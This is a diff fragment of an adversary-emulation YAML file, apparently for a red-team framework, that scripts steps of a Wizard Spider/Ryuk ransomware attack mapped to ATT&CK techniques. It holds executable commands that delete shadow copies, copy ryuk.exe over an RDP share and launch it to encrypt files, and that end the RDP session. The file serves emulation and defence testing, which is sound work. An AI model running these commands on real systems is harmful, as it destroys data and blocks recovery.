+    Ryuk has used vssadmin Delete Shadows /all /quiet to delete volume shadow copies and vssadmin resize shadowstorage to force deletion of shadow copies created by third-party applications.
+  tactic: impact
+  technique:
+    attack_id: T1490
+    name: Inhibit System Recovery
+  cti_source: "https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/"
+  procedure_group: procedure_impact
+  procedure_step: 9.A.5
+  platforms:
+    windows:
+      psh:
+        command: |
+          cmd /c "C:\Users\Public\window.bat" 2> $null;
+          exit 0;
+
+# Step 10 - Ryuk Encryption for Impact
+
+- id: 06b694af-f503-44ca-bc3c-bd017f75ed89
+  name: Wizard Spider Downloads ryuk.exe
+  description: |
+    Downloads ryuk.exe ransomware.
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  cti_source: "https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf"
+  procedure_group: procedure_command_and_control
+  procedure_step: 10.A.1
+  platforms:
+    windows:
+      psh:
+        command: |
+          cmd /c "copy \\TSCLIENT\X\ryuk.exe C:\Users\Public\ryuk.exe"
+        cleanup: |
+          if (Test-Path "C:\Users\Public\ryuk.exe") { rm C:\Users\Public\ryuk.exe }
+
+- id: cd16fcb6-e1f0-4e0f-bb83-2369516587f2
+  name: Wizard Spider Executes Ryuk Ransomware
+  description: |
+    Starts a notepad process and executes ryuk.exe ransomware. When Ryuk executes, it will first gain SeDebugPrivilege.
+    Ryuk will then inject its own executable into a remote process, notepad.exe, via WriteProcessMemory and
+    CreateRemoteThread WinAPI calls. Ryuk uses a symmetric key algorithm, AES256 to encrypt files.
+    Note that the symmetric key is itself encrypted with RSA2048.
+  tactic: command-and-control
+  technique:
+    attack_id: T1486
+    name: Data Encrypted for Impact
+  cti_source: "https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/"
+  procedure_group: procedure_impact
+  procedure_step: 10.A.2-7
+  platforms:
+    windows:
+      psh:
+        timeout: 300
+        command: |
+          Start-Process C:\Windows\System32\notepad.exe;
+          cmd /c "C:\Users\Public\ryuk.exe --encrypt --process-name notepad.exe";
+
+- id: 95d6c92c-e328-4997-ae01-507b709dfa7b
+  name: Terminate RDP Session to Domain Controller
+  description: |
+    End the RDP session to the Domain Controller.
+    This ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),
+    since the RDP connection originates from the attacker's machine.
+  tactic: lateral-movement
+  technique:
+    attack_id: T1021.001
+    name: "Remote Services: Remote Desktop Protocol"
+  procedure_group: procedure_lateral_movement
+  procedure_step: 10.A.7
+  platforms:
+    linux:
+      proc:
+        command: |
+          pkill xfreerdp
